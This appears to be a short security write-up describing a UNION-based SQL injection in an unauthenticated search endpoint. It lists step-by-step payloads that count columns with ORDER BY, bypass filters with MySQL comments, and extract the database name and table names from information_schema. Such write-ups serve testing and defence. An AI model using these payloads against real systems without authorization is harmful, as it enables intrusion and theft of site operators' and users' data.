## Use case

The article describes a UNION-based SQL injection vulnerability found in an unauthenticated search feature of a web application. This vulnerability allowed the attacker to extract the active database name and enumerate the database schema, which could lead to further exploitation.

## Steps to test

1. Identify the search endpoint (e.g., /autosuggest.htm) and the query parameter (e.g., q).
2. Probe the endpoint with 'ORDER BY' clauses to determine the number of columns in the original SQL query (e.g., q=test' ORDER BY 8--).
3. Bypass any inline filters by using MySQL comments (/**/) in the payload.
4. Execute a UNION SELECT statement to extract the database name (e.g., q=-1'/**/UNION/**/SELECT/**/1,database(),3,4,5,6,7,8--).
5. Enumerate the database schema by querying information_schema.tables (e.g., q=-1'/**/UNION/**/SELECT/**/1,group_concat(table_name),3,4,5,6,7,8/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema='[REDACTED_DB_NAME]'--).
